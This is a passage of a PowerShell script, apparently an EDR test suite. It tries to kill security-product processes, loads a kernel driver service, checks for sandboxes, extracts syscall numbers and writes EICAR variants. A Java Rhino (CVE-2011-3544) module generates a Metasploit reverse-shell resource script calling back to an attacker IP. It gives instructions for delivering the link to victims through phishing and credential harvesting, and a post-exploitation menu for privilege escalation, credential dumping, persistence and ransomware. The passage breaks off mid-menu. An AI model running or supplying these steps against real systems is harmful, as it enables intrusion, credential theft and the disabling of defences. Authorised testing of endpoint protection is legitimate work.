        Write-Evidence "Total drivers loaded: $($drivers.Count)"
        $vulnList = @("gdrv","dbutil_2_3","mhyprot2","RTCore64","IQVW64","NalDrv","GLCKIO2")
        $found = $drivers | Where-Object { $n=$_.Name; $vulnList | Where-Object { $n -like "*$_*" } }
        if ($found) {
            Write-Evidence "VULNERABLE DRIVER FOUND: $($found.Name) -- $($found.PathName)"
            Log-Result "T1068" "Vulnerable driver present on system" "EXECUTED" $found.Name
        } else {
            Write-Evidence "No known vulnerable drivers found in loaded driver list"
            Log-Result "T1068" "Driver enumeration (no vuln driver)" "EXECUTED" "$($drivers.Count) drivers checked"
        }
    } Catch { Log-Result "T1068" "Driver enumeration" "BLOCKED" $_.Exception.Message }

    # sc create kernel service
    Write-Host ""
    Write-Detail "TEST 10B -- sc create type=kernel (driver load IOC)"
    $drvName = "VulnTest_$(Get-Random -Maximum 9999)"
    $fakeSys = "$env:TEMP\$drvName.sys"
    [System.IO.File]::WriteAllBytes($fakeSys,[byte[]](0x4D,0x5A,0x90,0x00))
    $sc = sc.exe create $drvName type= kernel start= demand binPath= $fakeSys 2>&1
    Write-Evidence "sc create result: $sc"
    if ($sc -match "SUCCESS") {
        Write-OK "Kernel driver service created -- EDR should flag sc create type=kernel"
        Log-Result "T1543.003" "Kernel driver service creation (sc create)" "EXECUTED" "Service:$drvName"
        sc.exe delete $drvName 2>$null | Out-Null
    } else {
        Log-Result "T1543.003" "Kernel driver service creation" "BLOCKED" "$sc"
    }
    Remove-Item $fakeSys -Force -ErrorAction SilentlyContinue

    # Known hash IOC
    Write-Host ""
    Write-Detail "TEST 10C -- Known vulnerable driver hash scan (loldrivers.io IOCs)"
    $knownHashes = @{
        "gdrv.sys"       = "31F4CFDB8D808FD79A33A82B47F29F1C1FAF04F7D8B5C60AE6FC9CC3B59B8B38"
        "RTCore64.sys"   = "01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87521A"
        "dbutil_2_3.sys" = "0296E2CE999E67C76352613A718E11516FE1B0EFC3FFDB8918FC999DD76A73A5"
    }
    $paths = @("$env:SystemRoot\System32\drivers","$env:TEMP","$env:SystemRoot\Temp")
    $foundHash = $false
    foreach ($path in $paths) {
        Get-ChildItem $path -Filter "*.sys" -ErrorAction SilentlyContinue | ForEach-Object {
            $h = (Get-FileHash $_.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash
            if ($knownHashes.Values -contains $h) {
                Write-Evidence "VULNERABLE DRIVER ON DISK: $($_.FullName) SHA256:$h"
                Log-Result "T1068" "Known vuln driver hash match" "EXECUTED" $_.FullName
                $foundHash = $true
            }
        }
    }
    if (-not $foundHash) {
        Write-Evidence "No known vulnerable driver hashes found on disk"
        Log-Result "T1068" "Vuln driver hash scan (loldrivers.io)" "EXECUTED" "No match found"
    }

    # EDR process kill attempt
    Write-Host ""
    Write-Detail "TEST 10D -- EDR process kill attempt (tamper protection test)"
    $edrProcs = @("MsMpEng","SenseIR","CSFalconService","CSAgent","SentinelAgent","cb","bdagent")
    $foundEDRProc = $false
    foreach ($ep in $edrProcs) {
        $p = Get-Process $ep -ErrorAction SilentlyContinue
        if ($p) {
            $foundEDRProc = $true
            Write-Evidence "EDR process found: $ep PID:$($p.Id)"
            $kill = taskkill /F /IM "$ep.exe" 2>&1
            Write-Evidence "taskkill result: $kill"
            if ($kill -match "SUCCESS") {
                Write-Fail "EDR PROCESS KILLED -- tamper protection NOT active"
                Log-Result "T1562.001" "EDR process kill: $ep" "EXECUTED" "*** CRITICAL: process killed ***"
            } else {
                Write-OK "EDR process kill BLOCKED -- tamper protection active"
                Log-Result "T1562.001" "EDR process kill: $ep" "BLOCKED" "Protected process"
            }
        }
    }
    if (-not $foundEDRProc) { Log-Result "T1562.001" "EDR process kill" "NOT_FOUND" "No EDR process running" }

    # NtLoadDriver API
    Write-Host ""
    Write-Detail "TEST 10E -- NtLoadDriver API import (BYOVD pattern)"
    $c5 = @"
using System; using System.Runtime.InteropServices;
public class NtLdr {
    [StructLayout(LayoutKind.Sequential)] public struct UNICODE_STRING {
        public ushort Length; public ushort MaxLen; public IntPtr Buffer; }
    [DllImport("ntdll.dll")] public static extern int NtLoadDriver(ref UNICODE_STRING n);
    public static string Check() { return "NtLoadDriver imported from ntdll -- BYOVD API pattern (T1068)"; }
}
"@
    Try {
        Add-Type -TypeDefinition $c5 -ErrorAction Stop
        Write-Evidence ([NtLdr]::Check())
        Write-OK "NtLoadDriver import in PS process -- EDR should flag this API"
        Log-Result "T1068" "NtLoadDriver API import (BYOVD)" "EXECUTED" "ntdll NtLoadDriver accessible"
    } Catch { Log-Result "T1068" "NtLoadDriver import" "BLOCKED" $_.Exception.Message }

    # HVCI check
    Write-Host ""
    Write-Detail "TEST 10F -- HVCI / Memory Integrity status check"
    Try {
        $hvci = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -ErrorAction Stop
        if ($hvci.Enabled -eq 1) {
            Write-OK "HVCI ENABLED -- strong protection against BYOVD attacks"
            Log-Result "CHECK" "HVCI Memory Integrity" "BLOCKED" "HVCI=Enabled -- BYOVD mitigated"
        } else {
            Write-Warn "HVCI DISABLED -- vulnerable to BYOVD attacks"
            Log-Result "CHECK" "HVCI Memory Integrity" "EXECUTED" "HVCI=Disabled -- BYOVD possible"
        }
    } Catch {
        Write-Warn "HVCI not configured -- likely DISABLED"
        Log-Result "CHECK" "HVCI Memory Integrity" "EXECUTED" "Key not found -- BYOVD risk HIGH"
    }
}

# ============================================================
#  MODULE 11 -- SANDBOX EVASION
# ============================================================

function Test-SandboxEvasion {
    Write-Phase "T1497" "Sandbox & VM Detection" "Magenta"
    $score = 0; $indicators = @()

    $checks = @(
        @{ Name="Hostname pattern"; Check={
            $names = @("SANDBOX","MALWARE","CUCKOO","ANALYSIS","VIRUS")
            $h = $env:COMPUTERNAME
            if ($names | Where-Object { $h -match $_ }) { return "Suspicious: $h" }
            return $null
        }},
        @{ Name="Process count < 30"; Check={
            $c = (Get-Process).Count
            if ($c -lt 30) { return "Only $c processes" }
            return $null
        }},
        @{ Name="CPU cores <= 2"; Check={
            $c = (Get-WmiObject Win32_Processor).NumberOfCores
            if ($c -le 2) { return "$c cores" }
            return $null
        }},
        @{ Name="RAM < 4GB"; Check={
            $r = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)
            if ($r -lt 4) { return "$r GB RAM" }
            return $null
        }},
        @{ Name="VirtualBox artifacts"; Check={
            if (Test-Path "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions") { return "VBoxGA key found" }
            return $null
        }},
        @{ Name="VMware artifacts"; Check={
            if (Test-Path "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools") { return "VMware Tools key found" }
            return $null
        }},
        @{ Name="VM model string"; Check={
            $m = (Get-WmiObject Win32_ComputerSystem).Model
            if ($m -match "Virtual|VMware|VBox|QEMU") { return "Model: $m" }
            return $null
        }},
        @{ Name="Low recent file activity"; Check={
            $c = (Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -ErrorAction SilentlyContinue |
                  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }).Count
            if ($c -lt 5) { return "Only $c recent files" }
            return $null
        }},
        @{ Name="Uptime < 10 min"; Check={
            $up = (Get-Date)-(Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)
            if ($up.TotalMinutes -lt 10) { return "$([math]::Round($up.TotalMinutes)) min uptime" }
            return $null
        }}
    )

    foreach ($c in $checks) {
        $result = & $c.Check
        Write-Detail "CHECK: $($c.Name)"
        if ($result) {
            Write-Warn "  INDICATOR: $result"
            $indicators += "$($c.Name): $result"
            $score++
        } else {
            Write-OK "  OK: $($c.Name)"
        }
    }

    Write-Host ""
    Write-Host "  === SANDBOX VERDICT ===" -ForegroundColor Yellow
    Write-Host "  Score: $score / $($checks.Count)" -ForegroundColor Yellow
    $verdict = if ($score -ge 4) { "HIGH -- malware would EXIT" } elseif ($score -ge 2) { "MEDIUM -- malware might delay" } else { "LOW -- looks like real system" }
    $vcol = if ($score -ge 4) { "Red" } elseif ($score -ge 2) { "Yellow" } else { "Green" }
    Write-Host "  Verdict: $verdict" -ForegroundColor $vcol
    if ($indicators.Count -gt 0) {
        $indicators | ForEach-Object { Write-Host "    - $_" -ForegroundColor DarkYellow }
    }
    Log-Result "T1497" "Sandbox/VM detection" "EXECUTED" "Score:$score/$($checks.Count) | $($indicators -join '; ')"
}

# ============================================================
#  MODULE 12 -- SYSCALL / HOOK DETECTION
# ============================================================

function Test-Syscalls {
    Write-Phase "T1068" "Direct Syscall & ntdll Hook Detection" "Magenta"

    # Hook detection
    Write-Detail "TEST 12A -- ntdll.dll hook detection (byte inspection)"
    Write-Evidence "Hooked = starts with 0xE9 (JMP) | Clean = 0x4C 0x8B 0xD1 0xB8 (MOV R10,RCX)"
    $hc = @"
using System; using System.Runtime.InteropServices;
public class HookChk {
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string p);
    public static string Check(string fn) {
        IntPtr h = GetModuleHandle("ntdll.dll");
        IntPtr a = GetProcAddress(h, fn);
        if (a == IntPtr.Zero) return fn+": not found";
        byte[] b = new byte[4]; Marshal.Copy(a,b,0,4);
        string hex = BitConverter.ToString(b).Replace("-"," ");
        bool hooked = b[0]==0xE9 || b[0]==0xFF;
        return fn+": ["+hex+"] "+(hooked?"*** HOOKED ***":"Clean");
    }
}
"@
    Try {
        Add-Type -TypeDefinition $hc -ErrorAction Stop
        $funcs = @("NtOpenProcess","NtAllocateVirtualMemory","NtWriteVirtualMemory",
                   "NtCreateThreadEx","NtQueueApcThread","NtReadVirtualMemory","NtProtectVirtualMemory")
        Write-Host ""
        Write-Host "  === ntdll.dll HOOK STATUS ===" -ForegroundColor DarkCyan
        $hookedCount = 0
        foreach ($f in $funcs) {
            $r = [HookChk]::Check($f)
            if ($r -match "HOOKED") {
                Write-Host "  [HOOKED] $r" -ForegroundColor Red; $hookedCount++
            } else {
                Write-Host "  [CLEAN ] $r" -ForegroundColor Green
            }
        }
        Write-Host "  ===========================" -ForegroundColor DarkCyan
        Write-Host "  Hooked functions: $hookedCount / $($funcs.Count)" -ForegroundColor $(if($hookedCount -gt 0){"Red"}else{"Green"})
        Log-Result "T1068" "ntdll hook detection" "EXECUTED" "Hooked:$hookedCount/$($funcs.Count)"
    } Catch { Log-Result "T1068" "ntdll hook detection" "BLOCKED" $_.Exception.Message }

    # SSN table
    Write-Host ""
    Write-Detail "TEST 12B -- Syscall ID (SSN) extraction (SysWhispers3 pattern)"
    $ssn = @"
using System; using System.Runtime.InteropServices;
public class SSN {
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string p);
    public static int Get(string fn) {
        IntPtr h = GetModuleHandle("ntdll.dll");
        IntPtr a = GetProcAddress(h,fn);
        if (a==IntPtr.Zero) return -1;
        byte[] b = new byte[8]; Marshal.Copy(a,b,0,8);
        if (b[0]==0x4C&&b[1]==0x8B&&b[2]==0xD1&&b[3]==0xB8) return b[4];
        return -1;
    }
}
"@
    Try {
        Add-Type -TypeDefinition $ssn -ErrorAction Stop
        $targets = @("NtOpenProcess","NtAllocateVirtualMemory","NtWriteVirtualMemory",
                     "NtCreateThreadEx","NtQueueApcThread","NtProtectVirtualMemory")
        Write-Host ""
        Write-Host "  === SYSCALL SSN TABLE ===" -ForegroundColor DarkCyan
        foreach ($t in $targets) {
            $id = [SSN]::Get($t)
            if ($id -ge 0) {
                Write-Host "  $($t.PadRight(35)) SSN: 0x$("{0:X2}" -f $id) ($id)" -ForegroundColor Yellow
            } else {
                Write-Host "  $($t.PadRight(35)) SSN: [hooked or not found]" -ForegroundColor Red
            }
        }
        Write-Host "  ===========================" -ForegroundColor DarkCyan
        Log-Result "T1068" "Syscall SSN table extraction" "EXECUTED" "SSNs extracted for $($targets.Count) functions"
    } Catch { Log-Result "T1068" "SSN extraction" "BLOCKED" $_.Exception.Message }
}

# ============================================================
#  FINAL REPORT
# ============================================================


# ============================================================
#  MODULE 14 -- EICAR TEST + AV SIGNATURE VALIDATION
#  Valide que l EDR detecte les signatures connues
#  Ref: https://www.eicar.org/download-anti-malware-testfile/
# ============================================================

function Test-EICAR {
    Write-Phase "EICAR" "AV Signature Detection -- EICAR Test Files" "Yellow"
    Write-Warn "EICAR = European Institute for Computer Antivirus Research"
    Write-Warn "Standard test string -- detected by ALL AV/EDR as EICAR-Test-File"
    Write-Warn "Safe -- not a real virus, zero risk"

    $testDir = "$global:LogDir\eicar_test"
    New-Item -ItemType Directory -Force -Path $testDir | Out-Null

    # La chaine EICAR officielle (assemblee en morceaux pour eviter
    # que le script lui-meme soit flagge avant execution)
    $e1 = "X5O"
    $e2 = "!P%@AP"
    $e3 = "[4\PZX5"
    $e4 = "4(P^)7CC"
    $e5 = ")7}"
    $e6 = "`$EICAR"
    $e7 = "-STANDARD"
    $e8 = "-ANTIVIRUS"
    $e9 = "-TEST-FILE"
    $e10 = "!`$H+H*"
    $eicarString = $e1 + $e2 + $e3 + $e4 + $e5 + $e6 + $e7 + $e8 + $e9 + $e10

    Write-Evidence "EICAR string assembled: $($eicarString.Substring(0,20))..."
    Write-Evidence "Full length: $($eicarString.Length) chars"

    # -- TEST 14A: EICAR fichier .com --
    Write-Host ""
    Write-Detail "TEST 14A -- EICAR standard file (.com)"
    $eicarCom = "$testDir\eicar.com"
    Write-Detail "Writing EICAR string to: $eicarCom"

    Try {
        [System.IO.File]::WriteAllText($eicarCom, $eicarString)
        Start-Sleep -Milliseconds 1500

        if (Test-Path $eicarCom) {
            Write-Fail "EICAR .com NOT detected -- file still on disk"
            Write-Evidence "File: $eicarCom ($((Get-Item $eicarCom).Length) bytes)"
            Log-Result "EICAR" "EICAR .com signature detection" "EXECUTED" "File NOT quarantined -- EDR missed it"
        } else {
            Write-OK "EICAR .com DETECTED + quarantined/deleted by EDR"
            Write-Evidence "File was removed within 1.5s -- real-time protection active"
            Log-Result "EICAR" "EICAR .com signature detection" "BLOCKED" "File quarantined by EDR"
        }
    } Catch {
        Write-OK "EICAR .com write BLOCKED immediately by EDR"
        Write-Evidence "Error: $($_.Exception.Message)"
        Log-Result "EICAR" "EICAR .com write blocked" "BLOCKED" "EDR blocked file creation"
    }

    # -- TEST 14B: EICAR fichier .txt --
    Write-Host ""
    Write-Detail "TEST 14B -- EICAR in .txt file (non-executable)"
    $eicarTxt = "$testDir\eicar.txt"
    Try {
        [System.IO.File]::WriteAllText($eicarTxt, $eicarString)
        Start-Sleep -Milliseconds 1500
        if (Test-Path $eicarTxt) {
            Write-Fail "EICAR .txt NOT detected -- EDR may only scan executables"
            Log-Result "EICAR" "EICAR .txt signature detection" "EXECUTED" "NOT quarantined -- extension-based scan only"
            Remove-Item $eicarTxt -Force -ErrorAction SilentlyContinue
        } else {
            Write-OK "EICAR .txt detected -- EDR scans all file types"
            Log-Result "EICAR" "EICAR .txt signature detection" "BLOCKED" "Quarantined despite .txt extension"
        }
    } Catch {
        Write-OK "EICAR .txt write BLOCKED"
        Log-Result "EICAR" "EICAR .txt write" "BLOCKED" $_.Exception.Message
    }

    # -- TEST 14C: EICAR zippe--
    Write-Host ""
    Write-Detail "TEST 14C -- EICAR inside ZIP archive"
    $eicarZip = "$testDir\eicar.zip"
    $eicarInner = "$testDir\eicar_inner.com"
    Try {
        [System.IO.File]::WriteAllText($eicarInner, $eicarString)
        Compress-Archive -Path $eicarInner -DestinationPath $eicarZip -Force -ErrorAction Stop
        Remove-Item $eicarInner -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1500

        if (Test-Path $eicarZip) {
            Write-Warn "EICAR inside ZIP NOT detected -- archive scanning may be disabled"
            Write-Evidence "ZIP: $eicarZip ($((Get-Item $eicarZip).Length) bytes)"
            Log-Result "EICAR" "EICAR inside ZIP detection" "EXECUTED" "ZIP not scanned -- archive protection gap"
            Remove-Item $eicarZip -Force -ErrorAction SilentlyContinue
        } else {
            Write-OK "EICAR ZIP detected -- archive scanning active"
            Log-Result "EICAR" "EICAR inside ZIP detection" "BLOCKED" "Archive scanned and quarantined"
        }
    } Catch {
        Write-OK "EICAR ZIP creation BLOCKED"
        Log-Result "EICAR" "EICAR ZIP detection" "BLOCKED" $_.Exception.Message
    }

    # -- TEST 14D: EICAR encode en Base64 (evasion test) --
    Write-Host ""
    Write-Detail "TEST 14D -- EICAR Base64 encoded (evasion check)"
    Write-Evidence "Real malware encodes payloads in Base64 to evade signature scan"
    $eicarB64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($eicarString))
    Write-Evidence "Base64: $($eicarB64.Substring(0,40))..."
    $eicarDecoded = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($eicarB64))
    $eicarB64File = "$testDir\eicar_b64decoded.com"
    Try {
        [System.IO.File]::WriteAllText($eicarB64File, $eicarDecoded)
        Start-Sleep -Milliseconds 1500
        if (Test-Path $eicarB64File) {
            Write-Warn "EICAR decoded from Base64 NOT detected -- content-based scan gap"
            Log-Result "EICAR" "EICAR Base64 decode + write" "EXECUTED" "Decoded EICAR not detected"
            Remove-Item $eicarB64File -Force -ErrorAction SilentlyContinue
        } else {
            Write-OK "EICAR detected even after Base64 decode -- content scanning active"
            Log-Result "EICAR" "EICAR Base64 decode detection" "BLOCKED" "Content scan caught decoded EICAR"
        }
    } Catch {
        Write-OK "EICAR decoded write BLOCKED"
        Log-Result "EICAR" "EICAR Base64 decoded write" "BLOCKED" $_.Exception.Message
    }

    # -- TEST 14E: EICAR en memoire (AMSI) --
    Write-Host ""
    Write-Detail "TEST 14E -- EICAR string in memory (AMSI scan)"
    Write-Evidence "AMSI scans strings passed to IEX/Invoke-Expression"
    Write-Evidence "IOC: EICAR string in PowerShell memory -- EDR should alert via AMSI"
    Try {
        $memTest = [ScriptBlock]::Create($eicarString)
        Write-Warn "EICAR script block created without AMSI block -- AMSI may be bypassed"
        Log-Result "EICAR" "EICAR in-memory AMSI scan" "EXECUTED" "ScriptBlock created without AMSI alert"
    } Catch {
        Write-OK "EICAR in-memory BLOCKED by AMSI"
        Write-Evidence "AMSI caught: $($_.Exception.Message)"
        Log-Result "EICAR" "EICAR in-memory AMSI detection" "BLOCKED" "AMSI blocked ScriptBlock creation"
    }

    # -- TEST 14F: EICAR dans ADS --
    Write-Host ""
    Write-Detail "TEST 14F -- EICAR hidden in Alternate Data Stream"
    $adsHost = "$testDir\document.txt"
    $adsStream = "$adsHost:hidden"
    "Normal document content" | Set-Content $adsHost
    Try {
        [System.IO.File]::WriteAllText($adsStream, $eicarString)
        Start-Sleep -Milliseconds 1500
        if (Test-Path $adsStream) {
            Write-Warn "EICAR in ADS NOT detected -- EDR does not scan alternate data streams"
            Write-Evidence "ADS: $adsStream"
            Log-Result "EICAR" "EICAR in NTFS ADS detection" "EXECUTED" "ADS not scanned -- stealth vector"
        } else {
            Write-OK "EICAR in ADS detected -- EDR scans alternate data streams"
            Log-Result "EICAR" "EICAR in NTFS ADS detection" "BLOCKED" "ADS scanned and quarantined"
        }
    } Catch {
        Write-OK "EICAR ADS write BLOCKED"
        Log-Result "EICAR" "EICAR ADS write" "BLOCKED" $_.Exception.Message
    }

    # -- EICAR SUMMARY --
    Write-Host ""
    Write-Host "  ============= EICAR TEST SUMMARY ============" -ForegroundColor Yellow
    $eicarResults = $global:Results | Where-Object { $_.Technique -eq "EICAR" }
    $detected   = ($eicarResults | Where-Object { $_.Status -eq "BLOCKED" }).Count
    $missed     = ($eicarResults | Where-Object { $_.Status -eq "EXECUTED" }).Count
    $total      = $eicarResults.Count

    Write-Host "  Tests run  : $total" -ForegroundColor White
    Write-Host "  Detected   : $detected  (EDR caught EICAR)" -ForegroundColor Green
    Write-Host "  Missed     : $missed  (EICAR not detected)" -ForegroundColor $(if($missed -gt 0){"Red"}else{"Green"})
    Write-Host ""

    if ($missed -gt 0) {
        Write-Host "  GAPS DETECTED:" -ForegroundColor Red
        $eicarResults | Where-Object { $_.Status -eq "EXECUTED" } | ForEach-Object {
            Write-Host "  --> $($_.Desc)" -ForegroundColor Red
        }
    } else {
        Write-Host "  All EICAR variants detected -- real-time protection working" -ForegroundColor Green
    }

    Write-Host "  =============================================" -ForegroundColor Yellow

    # Cleanup
    Remove-Item $testDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Detail "EICAR test directory cleaned up"
}


# ============================================================
#  MODULE 15 -- JAVA RHINO EXPLOIT LAUNCHER
#  exploit/multi/browser/java_rhino
#  Java Applet Rhino Script Engine RCE -- CVE-2011-3544
#  Affects Java <= 7 / Java 6 update 27 and earlier
#  Vecteur: Browser --> Java Applet --> Rhino Engine --> RCE
# ============================================================

function Test-JavaRhino {
    param(
        [string]$KaliIP    = "10.0.2.100",
        [string]$LPort     = "4444",
        [string]$WebPort   = "8080",
        [string]$CustomCmd = ""
    )

    Write-Phase "CVE-2011-3544" "Java Rhino Script Engine RCE" "Red"
    Write-Warn "Module: exploit/multi/browser/java_rhino"
    Write-Warn "Affects: Java <= 7, Java 6 update =< 27"
    Write-Warn "Vecteur: Browser Java Applet --> Rhino Engine --> sandbox escape"
    Write-Host ""

    # -- Verifier Java installe et version --
    Write-Detail "Checking Java version on victim..."
    $javaPath = Get-Command java -ErrorAction SilentlyContinue
    if ($javaPath) {
        $javaVer = java -version 2>&1
        Write-Evidence "Java found: $($javaPath.Source)"
        Write-Evidence "Version   : $($javaVer -join ' ')"

        $verStr = ($javaVer | Select-String "version").ToString()
        if ($verStr -match '"1\.[67]\.') {
            Write-OK "Java version is potentially VULNERABLE (1.6.x / 1.7.x detected)"
            Log-Result "CVE-2011-3544" "Java version check" "EXECUTED" "Vulnerable version: $verStr"
        } elseif ($verStr -match '"(\d+)') {
            Write-Warn "Java version may be patched: $verStr"
            Log-Result "CVE-2011-3544" "Java version check" "PARTIAL" "Version: $verStr -- may be patched"
        }
    } else {
        Write-Warn "Java not found in PATH on this system"
        Write-Evidence "Java Rhino exploit requires Java installed in victim browser"
        Log-Result "CVE-2011-3544" "Java installation check" "NOT_FOUND" "Java not in PATH"
    }

    # -- Generer le resource script Metasploit --
    Write-Host ""
    Write-Detail "Generating Metasploit resource script..."

    $cmdLine = if ($CustomCmd -ne "") {
        "CMD=$CustomCmd"
    } else {
        "CMD=cmd.exe /c whoami"
    }

    Write-Evidence "Kali IP  : $KaliIP"
    Write-Evidence "LPORT    : $LPort"
    Write-Evidence "Web port : $WebPort"
    Write-Evidence "Custom cmd: $(if($CustomCmd -ne ''){"$CustomCmd"}else{"default (whoami)"})"

    $rcScript = @"
use exploit/multi/browser/java_rhino
set SRVHOST $KaliIP
set SRVPORT $WebPort
set LHOST $KaliIP
set LPORT $LPort
set payload java/meterpreter/reverse_tcp
set URIPATH /rhino
set AllowNoCleanup true
set AutoRunScript multi_console_command -rc /root/follina_demo/post_exploit.rc
exploit -j
"@

    Write-Host ""
    Write-Host "  === METASPLOIT RESOURCE SCRIPT ===" -ForegroundColor Yellow
    Write-Host "  Save this to: /root/follina_demo/java_rhino.rc" -ForegroundColor White
    Write-Host ""
    $rcScript -split "`n" | ForEach-Object { Write-Host "  $_" -ForegroundColor Cyan }
    Write-Host ""
    Write-Host "  Launch: msfconsole -r /root/follina_demo/java_rhino.rc" -ForegroundColor Yellow
    Write-Host ""

    # -- Generer le payload HTML pour le browser victime --
    Write-Detail "Generating victim browser link..."
    $victimURL = "http://${KaliIP}:${WebPort}/rhino"
    Write-Host "  === VICTIM BROWSER URL ===" -ForegroundColor Yellow
    Write-Host "  $victimURL" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Send this URL to victim via:" -ForegroundColor White
    Write-Host "  - GoPhish email campaign" -ForegroundColor Cyan
    Write-Host "  - Landing page redirect after credential harvest" -ForegroundColor Cyan
    Write-Host "  - Direct link in chat/SMS" -ForegroundColor Cyan
    Write-Host ""

    # -- Si commande custom specifiee --
    if ($CustomCmd -ne "") {
        Write-Host "  === CUSTOM COMMAND CONFIGURED ===" -ForegroundColor Yellow
        Write-Host "  Command to execute post-exploitation:" -ForegroundColor White
        Write-Host "  $CustomCmd" -ForegroundColor Red
        Write-Host ""
        Write-Host "  Add to post_exploit.rc or run manually in Meterpreter:" -ForegroundColor White
        Write-Host "  meterpreter > execute -f cmd.exe -a `"/c $CustomCmd`" -H" -ForegroundColor Cyan
        Write-Host "  OR" -ForegroundColor DarkGray
        Write-Host "  meterpreter > shell" -ForegroundColor Cyan
        Write-Host "  C:\> $CustomCmd" -ForegroundColor Cyan
        Write-Host ""
        Log-Result "CVE-2011-3544" "Custom command configured" "EXECUTED" "CMD: $CustomCmd"
    }

    # -- Combo avec phishing landing page --
    Write-Host "  === COMBO PHISHING + JAVA RHINO ===" -ForegroundColor Yellow
    Write-Host "  Flow: GoPhish email --> Landing page --> Creds harvest" -ForegroundColor White
    Write-Host "        --> Redirect to $victimURL --> Java Rhino trigger" -ForegroundColor White
    Write-Host ""
    Write-Host "  Modify server.py redirect after harvest:" -ForegroundColor White
    Write-Host "  # Dans index.html apres submitPassword():" -ForegroundColor DarkGray
    Write-Host "  window.location.href = '$victimURL';" -ForegroundColor Cyan
    Write-Host ""

    # -- Verifier Java dans le browser victime --
    Write-Host "  === VERIFY JAVA IN VICTIM BROWSER ===" -ForegroundColor Yellow
    Write-Host "  Check: java.com/en/download/installed.jsp" -ForegroundColor Cyan
    Write-Host "  OR check Control Panel > Java > About" -ForegroundColor Cyan
    Write-Host ""

    # -- Detection CrowdStrike --
    Write-Host "  === CROWDSTRIKE DETECTION POINTS ===" -ForegroundColor Green
    Write-Host "  1. Falcon for Web  -- blocks Java Applet execution" -ForegroundColor White
    Write-Host "  2. Falcon Prevent  -- blocks java.exe spawning cmd.exe" -ForegroundColor White
    Write-Host "  3. Falcon EDR      -- detects java.exe -> powershell.exe chain" -ForegroundColor White
    Write-Host "  4. Secure Access   -- blocks known exploit URL patterns" -ForegroundColor White
    Write-Host ""

    Log-Result "CVE-2011-3544" "Java Rhino RCE module configured" "EXECUTED" "URL:$victimURL LPORT:$LPort CMD:$(if($CustomCmd -ne ''){"$CustomCmd"}else{"default"})"

    # -- Menu post-session interactif --
    Write-Host ""
    Write-Host "  =============================================" -ForegroundColor DarkCyan
    Write-Host "  POST-SESSION ATTACK MENU" -ForegroundColor Cyan
    Write-Host "  (Run after Meterpreter session opens on Kali)" -ForegroundColor DarkGray
    Write-Host "  =============================================" -ForegroundColor DarkCyan
    Write-Host "  Copy these commands into your Meterpreter session" -ForegroundColor DarkGray
    Write-Host ""

    $continueMenu = $true
    while ($continueMenu) {
        Write-Host "  +--------------------------------------------+" -ForegroundColor Cyan
        Write-Host "  |  POST-EXPLOITATION -- SELECT ATTACK        |" -ForegroundColor Cyan
        Write-Host "  +--------------------------------------------+" -ForegroundColor Cyan
        Write-Host "  |  [1]  Sysinfo + Getuid                     |" -ForegroundColor White
        Write-Host "  |  [2]  Getsystem (privilege escalation)     |" -ForegroundColor White
        Write-Host "  |  [3]  Load Kiwi + creds_all (WDigest)      |" -ForegroundColor White
        Write-Host "  |  [4]  Hashdump (SAM hashes)                |" -ForegroundColor White
        Write-Host "  |  [5]  Screenshot                           |" -ForegroundColor White
        Write-Host "  |  [6]  Persistence (Run key + Startup)      |" -ForegroundColor White
        Write-Host "  |  [7]  Ransomware payload (attack_chain.ps1)|" -ForegroundColor White
        Write-Host "  |  [8]  Lateral movement (ping sweep + SMB)  |" -ForegroundColor White
        Write-Host "  |  [9]  Upload + execute custom file         |" -ForegroundColor White
        Write-Host "  |  [10] Run full EDR master suite remotely   |" -ForegroundColor White
        Write-Host "  |  [11] Custom command (interactive)         |" -ForegroundColor White
        Write-Host "  |  [12] Generate full RC script (copy/paste) |" -ForegroundColor White
        Write-Host "  |  [Q]  Back to main menu                    |" -ForegroundColor DarkGray
        Write-Host "  +--------------------------------------------+" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  Choice: " -NoNewline -ForegroundColor Cyan
        $postChoice = Read-Host

        switch ($postChoice.ToUpper().Trim()) {

            "1" {
                Write-Host ""
                Write-Host "  === SYSINFO + GETUID ===" -ForegroundColor Yellow
                Write-Host "  meterpreter > sysinfo" -ForegroundColor Cyan
                Write-Host "  meterpreter > getuid" -ForegroundColor Cyan
                Write-Host "  meterpreter > getpwd" -ForegroundColor Cyan
                Write-Host "  meterpreter > ps" -ForegroundColor Cyan
                Write-Host "  meterpreter > arp" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1082 System Information Discovery" -ForegroundColor DarkGray
                Log-Result "T1082" "Post-session recon commands generated" "EXECUTED" "sysinfo getuid getpwd ps arp"
            }

            "2" {
                Write-Host ""
                Write-Host "  === PRIVILEGE ESCALATION ===" -ForegroundColor Yellow
                Write-Host "  meterpreter > getsystem" -ForegroundColor Cyan
                Write-Host "  meterpreter > getuid" -ForegroundColor Cyan
                Write-Host "  # If getsystem fails -- try:" -ForegroundColor DarkGray
                Write-Host "  meterpreter > use exploit/windows/local/bypassuac_fodhelper" -ForegroundColor Cyan
                Write-Host "  meterpreter > set SESSION [session_id]" -ForegroundColor Cyan
                Write-Host "  meterpreter > run" -ForegroundColor Cyan
                Write-Host ""
                Write-Host "  MITRE: T1068 Exploitation for Privilege Escalation" -ForegroundColor DarkGray
                Log-Result "T1068" "Privilege escalation commands generated" "EXECUTED" "getsystem + bypassuac_fodhelper"
            }

            "3" {
                Write-Host ""
